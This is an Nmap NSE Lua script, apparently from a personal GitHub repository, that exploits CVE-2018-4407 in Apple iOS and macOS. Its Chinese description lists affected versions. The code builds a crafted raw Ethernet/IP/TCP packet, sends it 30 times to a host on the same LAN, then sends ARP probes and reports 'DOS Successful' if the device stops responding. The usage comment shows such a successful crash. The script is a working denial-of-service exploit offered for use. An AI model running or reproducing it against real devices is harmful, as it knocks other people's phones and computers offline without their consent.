local stdnse = require "stdnse"
local nmap = require "nmap"
local packet = require "packet"
local vulns = require "vulns"

author = "L"
github = "https://github.com/L-codes/my-nse"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"dos", "vuln"}

description=[[
CVE-2018-4407 (IOS/OSX缓冲区溢出漏洞)

影响版本
Apple iOS 11及更早版本：所有设备（升级到iOS 12的部分设备）
Apple macOS High Sierra（受影响的最高版本为10.13.6）：所有设备（通过安全更新2018-001修复）
Apple macOS Sierra（受影响的最高版本为10.12.6）：所有设备（通过安全更新2018-005中修复）

注意
该攻击的数据帧，不能跨路由，仅能在同网段下的进行攻击

]]

---
-- @usage
-- nmap --script CVE-2018-4407 192.168.43.89
-- Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-02 15:18 CST
-- Nmap scan report for 192.168.43.89
-- Host is up (0.19s latency).
-- MAC Address: 48:74:6E:73:52:73 (Apple)
-- 
-- Host script results:
-- |_CVE-2018-4407: DOS Successful
-- 
-- Nmap done: 1 IP address (1 host up) scanned in 0.56 seconds
--

hostrule = function(host)
  return true
end

local function check(layer2)
  return string.sub(layer2, 0, 12)
end

action = function(host)
  local raw = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\b\x00G\x00\x00X\x00\x01\x00\x00@\x06\xB2\xFB\xC0\xA8\x1F\x90\xC0\xA8\x1F\xBEAAAAAAAA\x00\x14\t\x8C\x00\x00\x00\x00\x00\x00\x00\x00\xF0\x02 \x00\x1Dq\x00\x00\x13\x14aaaaaaaaaaaaaaaaaa\x13\x14bbbbbbbbbbbbbbbbbb"
  local frame = packet.Frame:new(raw)
  frame:ip_set_bin_src(host.bin_ip_src)
  frame:ip_set_bin_dst(host.bin_ip)
  frame:ip_count_checksum()
  frame:tcp_count_checksum()
  if host.mac_addr then
    -- Send DOS Payload
    payload = host.mac_addr..host.mac_addr_src.."\x08\x00"..frame.buf
    local dnet = nmap.new_dnet()
    dnet:ethernet_open(host.interface)
    for n=1, 30 do 
      dnet:ethernet_send(payload)
    end

    -- Send ARP
		arp = "\xff\xff\xff\xff\xff\xff" ..
          host.mac_addr_src ..
					"\x08\x06" ..
					"\x00\x01\x08\x00\x06\x04\x00\x01" ..
          host.mac_addr_src ..
          host.bin_ip_src ..
					"\x00\x00\x00\x00\x00\x00" ..
					host.bin_ip 
    local pcap = nmap.new_socket()
    pcap:pcap_open(host.interface, 64, false, "arp")


    for n=1, 10 do 
      dnet:ethernet_send(arp)
    end
		local status, length, layer2, layer3
		local isup = false
    repeat
      pcap:set_timeout(100)
      local test = host.mac_addr_src .. host.mac_addr
      status, length, layer2, layer3 = pcap:pcap_receive()
      while status and test ~= check(layer2) do
        status, length, layer2, layer3 = pcap:pcap_receive()
        if status and test ~= check(layer2) then
          isup = true
        end
      end
    until status ~= true

    dnet:ethernet_close()
    pcap:pcap_close()
		
		if isup then
      return 'Not Vulnerability'
    else
      return 'DOS Successful'
		end
  else
    return 'Must be the same LAN'
  end
end
